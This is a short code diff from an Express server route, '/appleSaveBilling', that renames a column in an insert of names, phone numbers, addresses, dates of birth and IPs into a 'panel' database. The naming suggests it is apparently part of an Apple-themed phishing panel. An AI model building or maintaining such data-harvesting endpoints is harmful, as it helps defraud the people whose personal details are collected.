@@ -2145,7 +2145,7 @@ app.post("/appleSaveBilling", cors(), (req, res) => {
     ip,
     owner,
   ];
-  let query = `INSERT INTO apple(fullName,telephone, addy, town, pcode, dob, uniqueid,status,ip, owner) VALUES (?,?,?,?,?,?,?,1,?,?)`;
+  let query = `INSERT INTO apple(fullName,telephone, addy, city, pcode, dob, uniqueid,status,ip, owner) VALUES (?,?,?,?,?,?,?,1,?,?)`;
 
   panelConnection.query(query, details, (err, rows, fields) => {
     if (!err) res.send("Insertion Completed");
